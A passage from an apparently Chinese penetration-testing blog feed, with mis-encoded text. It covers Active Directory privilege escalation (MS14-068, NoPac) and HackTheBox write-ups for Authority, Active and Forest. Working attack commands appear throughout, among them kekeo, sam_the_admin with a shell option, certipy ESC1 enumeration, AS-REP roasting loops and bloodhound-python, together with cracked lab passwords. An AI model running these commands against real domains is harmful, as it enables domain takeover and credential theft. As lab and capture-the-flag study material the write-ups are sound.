æ˜¯KDCæ— æ³•æ­£ç¡®æ£€æŸ¥PACä¸­çš„æœ‰æ•ˆç­¾åï¼Œç”±äºå…¶å®ç°ç­¾åçš„åŠ å¯†å…è®¸æ‰€æœ‰çš„ç­¾åç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDCæœåŠ¡å°±ä¼šä½¿ç”¨æŒ‡å®šçš„ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸éœ€è¦ç›¸å…³å¯†é’¥çš„ç®—æ³•ï¼Œå¦‚MD5ï¼Œå®ç°å†…å®¹çš„ä»»æ„æ›´æ”¹ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è‡ªå·±æ„é€ ä¸€å¼ PACï¼Œä¼ªé€ ç”¨æˆ·çš„SIDå’Œæ‰€åœ¨çš„ç»„ã€‚</p><p>é‚£ä¹ˆé€šè¿‡ä¼ªé€ çš„PACï¼ŒåŠ å…¥åŸŸç®¡ç›¸å…³ä¿¡æ¯ï¼Œè®¿é—®åŸŸæ§æœåŠ¡ï¼ŒKDCä¼šè®¤ä¸ºå½“å‰ç”¨æˆ·æœ‰æƒé™ï¼Œä»è€ŒæŠŠè¿™ä¸ªç”¨æˆ·å½“ä½œåŸŸç®¡ç»„çš„æˆå‘˜ï¼Œè¿›è€Œè¾¾åˆ°æå‡è‡³åŸŸç®¡ç†å‘˜çš„æ•ˆæœ</p><p>åœ¨WIN2008ä¸Šåˆ©ç”¨kekeoæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä¾¿å¯ä»¥æˆåŠŸè®¿é—®åŸŸæ§CIFSæœåŠ¡</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:aurey.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨impacketä¸­çš„goldenPacï¼Œç›´æ¥è¿”å›ä¸€ä¸ªäº¤äº’å¼Shell</p><h3 id="CVE-2021-42278-amp-CVE-2021-42287ï¼ˆNoPacï¼‰"><a href="#CVE-2021-42278-amp-CVE-2021-42287ï¼ˆNoPacï¼‰" class="headerlink" title="CVE-2021-42278 &amp; CVE-2021-42287ï¼ˆNoPacï¼‰"></a>CVE-2021-42278 &amp; CVE-2021-42287ï¼ˆNoPacï¼‰</h3><p>CVE-2021-42278ï¼šæœºå™¨è´¦æˆ·çš„åå­—ä¸€èˆ¬ä»¥<code>$</code>ç»“å°¾ï¼Œä½†ADæ²¡æœ‰å¯¹åŸŸå†…æœºå™¨è´¦æˆ·ååšéªŒè¯ã€‚å¯¼è‡´æœºå™¨ç”¨æˆ·åå¯ä»¥è¢«å†’ç”¨</p><p>CVE-2021-42287ï¼šå‡è®¾åŸŸæ§åä¸ºDCï¼ˆå¯¹åº”çš„æœºå™¨è´¦æˆ·ä¸º<code>DC$</code>ï¼‰ï¼Œæ”»å‡»è€…åˆ©ç”¨CVE-2021-42278åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·<code>TEST$</code>ï¼Œå†æŠŠæœºå™¨è´¦æˆ·<code>TEST$</code>çš„sAMAccountNameæ”¹æˆDCã€‚æ­¤æ—¶ç”¨æˆ·DCç”³è¯·ä¸€ä¸ªTGTç¥¨æ®ã€‚å†æŠŠDCçš„sAMAccountNameæ”¹å›<code>TEST$</code>ã€‚è¿™æ—¶å€™KDCä¼šåˆ¤æ–­åŸŸå†…æ²¡æœ‰DCè¿™ä¸ªè´¦æˆ·ï¼Œè‡ªåŠ¨å–æœç´¢<code>DC$</code>ï¼ˆDC$æ˜¯åŸŸæ§DCçš„sAMAccountNameï¼‰ï¼Œæ”»å‡»è€…åˆ©ç”¨åˆšåˆšç”³è¯·çš„TGTè¿›è¡ŒS4U2Selfï¼Œæ¨¡æ‹ŸåŸŸæ§å»è¯·æ±‚STç¥¨æ®ï¼Œ æœ€ç»ˆè·å¾—åŸŸæ§DCçš„æƒé™ã€‚</p><p>å·¥å…·ï¼šsam-the-adminï¼š<a href="https://github.com/WazeHell/sam-the-admin" title="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python3 sam_the_admin.py <span class="hljs-string">&quot;king/windows03w:edcRFV222&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">204.146</span> <span class="hljs-literal">-shell</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŸŸæ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Authority - HackTheBox</title>
    <link href="/2023/07/23/Authority-HackTheBox/"/>
    <url>/2023/07/23/Authority-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¼€å±€å…ˆæ‰«æ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_D8YDBtzGtN.png" alt=""></p><p>enum4linuxæ‰¾ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œsmbmapè¿™è¾¹å‘ç°äº†å¯è¯»çš„å…±äº«</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_rZMnI29qzH.png" alt=""></p><h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><h3 id="SMB-information-leakage"><a href="#SMB-information-leakage" class="headerlink" title="SMB information leakage"></a>SMB information leakage</h3><p>ä¸‹è½½ä¸‹æ¥å¯ä»¥çœ‹åˆ°æ˜¯ä¸ªAnsibleè„šæœ¬</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6KrDOksijT.png" alt=""></p><p>æˆ‘é‡ç‚¹çœ‹äº†PWMï¼Œå› ä¸º8443ç«¯å£å¼€æ”¾ç€è¿™ä¸ªæœåŠ¡</p><p>é…ç½®æ–‡ä»¶ä¸­å‘ç°äº†ï¼š</p><ul><li>è´¦æˆ·svc_pwm</li><li>Ansibleè´¦æˆ·ï¼šAdministratorï¼›å¯†ç ï¼šWelcome1</li><li>å¼€å¯äº†WinRM</li><li>PWMç³»ç»Ÿçš„ä¸¤ä¸ªè´¦æˆ·å¯†ç </li></ul><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HOYtIwcUDI.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7K-3dMRMiJ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8EVjvCQg-I.png" alt=""></p><p>ç›´æ¥WinRMç™»å½•ä¸€ä¸‹è¿™ä¸ªadministratorè´¦æˆ·ï¼ˆç¡®å®ä¸è¡Œï¼Œæˆ‘ä¹Ÿè§‰å¾—æ²¡è¿™ä¹ˆç®€å•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_98842n_UT4.png" alt=""></p><h3 id="PWM-Service"><a href="#PWM-Service" class="headerlink" title="PWM Service"></a>PWM Service</h3><p>é‚£å°±æ˜¯ç”¨PWMçš„ç”¨æˆ·å¯†ç ç™»å½•ä¸Šå»çœ‹çœ‹èƒ½åšä»€ä¹ˆ</p><p>ç›´æ¥ç™»å½•ä¸è¡Œ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pZuSdPZ_hj.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5NvmcmfHKR.png" alt=""></p><p>åªèƒ½å†å›åˆ°æ–‡ä»¶é‡Œçœ‹çœ‹ï¼Œå‘ç°äº†çœŸæ­£çš„å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PqoDEKxLTq.png" alt=""></p><h3 id="Crack-the-Ansible-Vault"><a href="#Crack-the-Ansible-Vault" class="headerlink" title="Crack the Ansible-Vault"></a>Crack the Ansible-Vault</h3><p>GoogleæŸ¥äº†ç ´è§£æ–¹æ³•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Bb72VRcd3O.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_99tiVHyxp_.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mU-Wo3q-95.png" alt=""></p><p>æ•´ç†ä¸€ä¸‹è§£å¯†å‡ºæ¥çš„ä¿¡æ¯ï¼š</p><ul><li>ldap_admin_passwordï¼šDevT3st\@123</li><li>pwm_admin_passwordï¼špWm <em>@dm!N</em>!23</li><li>pwm_admin_loginï¼šsvc_pwm</li></ul><p>ç»ˆäºç™»å½•ä¸Šäº†è¿™ä¸ªå¹³å°</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_acGjwUzfah.png" alt=""></p><p>ä½†è¿™é‡Œåˆè¢«æŠ˜ç£¨äº†å¥½ä¹…ï¼Œä¹Ÿå»Githubå’ŒGoogleæœäº†å¾ˆå¤šè¿™ä¸ªé¡¹ç›®çš„ä¿¡æ¯</p><p>æœ€ååœ¨é…ç½®æ–‡ä»¶é‡Œçœ‹åˆ°äº†LDAPæœåŠ¡åœ°å€ï¼Œå›æƒ³èµ·ä¹‹å‰ç™»å½•çš„æ—¶å€™ä¸€ç›´åœ¨è­¦å‘ŠLDAPæœåŠ¡ä¸å¯ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠè¿™ä¸ªåœ°å€æ”¹æˆè‡ªå·±çš„åœ°å€ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oklhZUd9fM.png" alt=""></p><p>æ”¹å®Œä¹‹åç›‘å¬ç«¯å£ã€å†ä¸Šä¼ é…ç½®æ–‡ä»¶çœ‹çœ‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YVEXxe6w6a.png" alt=""></p><p>ç›´æ¥ä¹±ç ï¼Œå¯èƒ½æ˜¯åŠ å¯†è¿‡åæ‰å‘è¿‡æ¥çš„ï¼Œè¿™é‡Œåˆå°†ldapsæ”¹æˆldap</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PHN5v2l1RD.png" alt=""></p><p>è¿™å›èƒ½çœ‹è§ä¸œè¥¿äº†ï¼Œå‘ç°äº†svc_ldapç”¨æˆ·ï¼Œåé¢é‚£ä¸ªçŒœæµ‹æ˜¯ä¸ªå¯†ç ï¼š<code>lDaP_1n_th3_cle4r!</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d7gDOEvLG5.png" alt=""></p><p>æ‹¿ä¸‹user flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3915IknvUg.png" alt=""></p><h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><h3 id="ADCS-x20"><a href="#ADCS-x20" class="headerlink" title="ADCS&#x20;"></a>ADCS&#x20;</h3><p>è¿˜è®°å¾—SMBæ³„éœ²çš„Ansibleé‡Œé¢é™¤äº†LDAPå’ŒPWMä¹‹å¤–è¿˜æœ‰ADCSã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹è¯ä¹¦ææƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WZICsk0f2l.png" alt=""></p><h4 id="ADCS-information-collection"><a href="#ADCS-information-collection" class="headerlink" title="ADCS information collection"></a>ADCS information collection</h4><p>è¿™é‡Œä½¿ç”¨Certipyè¿›è¡Œä¿¡æ¯æ”¶é›†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u svc_ldap@authority.htb.corp -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -dc-only -stdout<br></code></pre></td></tr></table></figure><h4 id="ADCS-vulnerability-scanning"><a href="#ADCS-vulnerability-scanning" class="headerlink" title="ADCS vulnerability scanning"></a>ADCS vulnerability scanning</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certipy find -u svc_ldap@authority.htb.corp -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222 -vulnerable -stdout<br></code></pre></td></tr></table></figure><p>å‘ç°äº†å­˜åœ¨ESC1å’ŒESC7æ¼æ´</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L55bt-Q2si.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dSWCtwZhQV.png" alt=""></p><h4 id="ADCS-ESC1"><a href="#ADCS-ESC1" class="headerlink" title="ADCS ESC1"></a>ADCS ESC1</h4><p><strong>åŸç†ï¼š</strong> é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸç”¨æˆ·å¯ä»¥æ³¨å†ŒUserè¯ä¹¦æ¨¡æ¿ï¼ŒåŸŸæœºå™¨è´¦æˆ·å¯ä»¥æ³¨å†ŒMachineè¯ä¹¦æ¨¡æ¿ã€‚ä¸¤ä¸ªè¯ä¹¦æ¨¡æ¿éƒ½å…è®¸å®¢æˆ·ç«¯èº«ä»½éªŒè¯ã€‚å½“ç”¨æˆ·è´¦æˆ·ç”³è¯·Useræ¨¡æ¿è¯ä¹¦æ—¶ï¼Œç”¨æˆ·è´¦æˆ·çš„ç”¨æˆ·ä¸»ä½“åç§°ï¼ˆUser Principal Nameï¼ŒUPNï¼‰å°†åµŒå…¥è¯ä¹¦ï¼Œä»¥è¿›è¡Œè¯†åˆ«ã€‚</p><p>å½“ä½¿ç”¨è¯ä¹¦è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼ŒKDCä¼šå°è¯•å°†UPNä»è¯ä¹¦æ˜ å°„åˆ°ç›®æ ‡è´¦æˆ·ã€‚Userè¯ä¹¦æ¨¡æ¿çš„msPKI-Certificate-Name-Flagå±æ€§å­˜åœ¨ä¸€ä¸ªCT_FLAG_SUBJECT_ALT_REQUIRE_UPNæ ‡å¿—ä½ï¼Œå…¶æŒ‡ç¤ºCAå°†æ¥è‡ªæ´»åŠ¨ç›®å½•ä¸­è¯·æ±‚è€…ç”¨æˆ·å¯¹è±¡çš„UPNå±æ€§å€¼æ·»åŠ åˆ°å·²é¢å‘è¯ä¹¦çš„ä¸»é¢˜å¤‡ç”¨åç§°ä¸­ã€‚UPNå¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œæ„å‘³ç€ä¸èƒ½åŒæ—¶æœ‰ä¸¤ä¸ªå…·æœ‰ç›¸åŒUPNçš„ç”¨æˆ·ã€‚ä½†æ˜¯æœºå™¨è´¦æˆ·æ˜¯æ²¡æœ‰UPNå±æ€§çš„ï¼Œé‚£ä¹ˆæœºå™¨åœ¨ä½¿ç”¨è¯ä¹¦è¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œè¯ä¹¦æ¨¡æ¿çš„ msPKI-Certificate-Name-Flag å±æ€§è¿˜å­˜åœ¨CT_FLAG_SUBJECT_ALT_REQUIRE_DNS æ ‡å¿—ä½ï¼ŒæŒ‡ç¤ºCAå°†ä»æ´»åŠ¨ç›®å½•ä¸­è¯·æ±‚ç”¨æˆ·å¯¹è±¡çš„DNSå±æ€§è·å¾—çš„å€¼æ·»åŠ åˆ°å·²é¢å‘è¯ä¹¦çš„ä¸»é¢˜å¤‡ä»½åç§°ä¸­ã€‚ â€” å¼•ç”¨è‡ª<a href="https://item.jd.com/13378771.html" title="ã€Šå†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾ã€‹">ã€Šå†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾ã€‹</a></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æœºå™¨è´¦æˆ·ç”³è¯·è¯ä¹¦æ—¶ï¼Œè®¡ç®—æœºçš„DNSå±æ€§å€¼è¢«åµŒå…¥è¯ä¹¦ï¼Œä»¥è¿›è¡Œè¯†åˆ«ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æœºå™¨è´¦æˆ·ç”³è¯·è¯ä¹¦ï¼Œå¹¶å¡«å…¥Administratorçš„UPNï¼Œè¿›è¡Œææƒ</p><ol><li>å…ˆæ·»åŠ ä¸€ä¸ªæœºå™¨è´¦æˆ·</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_wQPnr71YoZ.png" alt=""></p><ol><li>é€šè¿‡certipyç”³è¯·UPNä¸ºAdministratorçš„è¯ä¹¦</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cz7Cn-pN9f.png" alt=""></p><ol><li>ä½¿ç”¨è¯ä¹¦è¿›è¡Œèº«ä»½éªŒè¯</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6uHu3zRNfV.png" alt=""></p><p>ä½†æ˜¯KDCä¼¼ä¹ä¸æ”¯æŒè¿™ç§æ–¹å¼ã€‚ä¸è¿‡æˆ‘ä»¬è¿™é‡Œç¡®å®æœ‰äº†è¯ä¹¦äº†</p><h4 id="PassTheCert"><a href="#PassTheCert" class="headerlink" title="PassTheCert"></a>PassTheCert</h4><p>Googleä¹‹ååœ¨Githubæ‰¾åˆ°äº†è¿™ä¸ªé¡¹ç›®ï¼Œéå¸¸ç¬¦åˆæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rw1WOrkBkz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bRTLFPPNHy.png" alt=""></p><ol><li>å…ˆæŠŠè¯ä¹¦å’Œç§é’¥åˆ†ç¦»</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DKu2GByFnX.png" alt=""></p><ol><li>é€šè¿‡è¯ä¹¦è¿›è¡Œè®¤è¯ï¼Œå®Œæˆææƒ</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PCP7nk5XWM.png" alt=""></p><p>æ‹¿ä¸‹Root Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5YM3VfmVW_.png" alt=""></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>æ€»ä½“æ‰“ä¸‹æ¥è¿˜æ˜¯æŒºæœ‰éš¾åº¦çš„ï¼Œæ‰“äº†ä¸‰å°Windowsé¶æœºäº†ï¼Œç›®å‰çš„æ€è·¯éƒ½æ˜¯ä»¥ä¿¡æ¯æ³„éœ²ä¸ºå…¥å£ï¼Œæ‰“æŸä¸ªæœåŠ¡è·å¾—å‡­æ®å†é€šè¿‡æŸä¸ªé…ç½®é”™è¯¯ææƒã€‚æ€»ä½“è€Œè¨€éœ€è¦å¯¹åŸŸæ¸—é€ã€Windowsåè®®æ¯”è¾ƒäº†è§£ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active - HackTheBox</title>
    <link href="/2023/07/22/Active-HackTheBox/"/>
    <url>/2023/07/22/Active-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¼€å±€å…ˆæ‰«æï¼Œå¯ä»¥çœ‹åˆ°ç»å…¸çš„SMBã€RPCã€LDAPã€‚éƒ½æ˜¯æˆ‘ä»¬ä¿¡æ¯æ”¶é›†çš„ç›®æ ‡</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_V6eVzNUJuG.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>å‘ç°äº†ä¸€ä¸ªå¯è¯»çš„å…±äº«</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OZ3VGNfPsz.png" alt=""></p><p>æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ˜¯ä¸¤ä¸ªç»„ç­–ç•¥æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶åŒ…å«ç”¨æˆ·åå¯†ç </p><p>ä½¿ç”¨gpp-decryptè¿›è¡Œè§£å¯†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jTGmNhMcMQ.png" alt=""></p><p>æ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰äº†ç”¨æˆ·å<code>active.htb\SVC_TGS</code>å’Œå¯†ç <code>GPPstillStandingStrong2k18</code></p><p>è·å¾—User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yFuamx1-F-.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>BloodHoundä¿¡æ¯æ”¶é›†ä¸€æ³¢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zGYojrslUd.png" alt=""></p><p>ç®€å•çœ‹äº†ä¸€ä¸‹æˆ‘ä»¬çš„<code>SVC_TGS</code>ç”¨æˆ·å¹¶ä¸åœ¨å…¶ä¸­ï¼Œæˆ‘çš„ç†è§£BloodHoundæ˜¯ç”¨æ¥å‘ç°å„ç§æƒé™å­˜åœ¨çš„é£é™©çš„ï¼Œè¿™é‡Œå¯èƒ½æ²¡æœ‰ã€‚ï¼ˆæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œæ¬¢è¿å¤§ä½¬æŒ‡æ­£ï¼‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_AapcJ6PdLM.png" alt=""></p><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªç”¨æˆ·å¯†ç ï¼Œå¯ä»¥è¯•ä¸€ä¸‹Kerberoastingæ”»å‡»ã€‚</p><p><strong>åŸç†ï¼š</strong> Kerberoastingæ”»å‡»ä¸»è¦æ˜¯åˆ©ç”¨Kerberosè®¤è¯ä¸­çš„ç¬¬å››æ­¥ï¼š<strong>TGS_REP</strong>ï¼Œè¿™ä¸€æ­¥ä¼šè¿”å›ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„NTLM HashåŠ å¯†çš„TGSç¥¨æ®ï¼ŒåŠ å¯†ç®—æ³•ä¸ºRC4-HMAC</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´è¯¥TGSç¥¨æ®è·å¾—æœåŠ¡çš„NTLM Hashï¼Œè¿™é‡Œæ‰“çš„æ˜¯CIFSæœåŠ¡</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_1m_DD8vGS0.png" alt=""></p><p>ä½¿ç”¨johnè¿›è¡Œçˆ†ç ´ï¼Œçˆ†ç ´æˆåŠŸï¼Œæˆ‘ä»¬è·å¾—äº†Administratorçš„å¯†ç ï¼š<code>Ticketmaster1968</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sbjEU20280.png" alt=""></p><p>ç›´æ¥smbæ‹¿åˆ°root.txt</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__ZoZNH6lzb.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Forest - HackTheBox</title>
    <link href="/2023/07/22/Forest-HackTheBox/"/>
    <url>/2023/07/22/Forest-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>å¹´è½»äººçš„ç¬¬ä¸€å°Windowsé¶æœº</p><p>æ²¡æ‰“è¿‡Windowsé¶æœºï¼Œè¿™å°ç”¨æ¥ç†Ÿæ‚‰ä¸€ä¸‹å¥—è·¯ï¼Œæ”¶é›†äº†å›½å†…å¤–å¾ˆå¤šWriteupæ€»ç»“ä¸‹å¤§ä¼™çš„æŠ€æœ¯å’Œæ€è·¯</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png" alt=""></p><h4 id="åŒºåŸŸä¼ è¾“"><a href="#åŒºåŸŸä¼ è¾“" class="headerlink" title="åŒºåŸŸä¼ è¾“"></a>åŒºåŸŸä¼ è¾“</h4><p>å¤±è´¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GqFcJ1o4JP.png" alt=""></p><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>æ²¡æœ‰åŒ¿åå…±äº«ç›®å½•</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lRDqPZiCky.png" alt=""></p><h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h4><p>RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æšä¸¾ç”¨æˆ·ï¼Œæ‹¿åˆ°äº†ç”¨æˆ·å’Œç”¨æˆ·ç»„ä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uiQj0W8ZPd.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7kmZCIKFhO.png" alt=""></p><p>æŸ¥æ‰¾å¯¹åº”çš„ç®¡ç†å‘˜ç»„åŠç®¡ç†å‘˜ä¿¡æ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HTyGLSaBeN.png" alt=""></p><h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux -v 10.10.10.161<br></code></pre></td></tr></table></figure><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>æ‹¿åˆ°äº†ç”¨æˆ·åï¼Œè¿™é‡Œåˆæš´éœ²äº†kerberosç«¯å£ã€‚ç›´æ¥å°è¯•ä¸€ä¸‹AS-REP Roastingæ”»å‡»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> user in $(cat user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span> htb/$&#123;user&#125; | grep -v impacket;done<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r-PfYEK1Uj.png" alt=""></p><p>æ‹¿åˆ°äº†svc-alfrescoç”¨æˆ·çš„hashï¼Œè¿™é‡Œä½¿ç”¨johnè¿›è¡Œç ´è§£ï¼Œå¾—åˆ°å¯†ç s3rvice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IZ7Pk1R-Ib.png" alt=""></p><h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p>æ‹¥æœ‰è´¦å·å¯†ç å¯ä»¥ç›´æ¥åˆ©ç”¨evil-winrmè¿æ¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7dB8sev2Tg.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><ol><li>è‡ªè¡Œæ­å»ºå¥½BloodHound</li><li>ä½¿ç”¨bloodhound-pythonè¿›è¡Œä¿¡æ¯æ”¶é›†</li><li>å°†æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼ˆjsonæ–‡ä»¶ï¼‰ä¸Šä¼ åˆ°BloodHoundè¿›è¡Œåˆ†æ</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns 10.10.10.161<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_USoKCwUulk.png" alt=""></p><p><img src="C:\Users\aurey\Downloads\Compressed\Forest\image\image_z7bQv1dJEF.png" alt=""></p><p><strong>Shortest Path from Owned 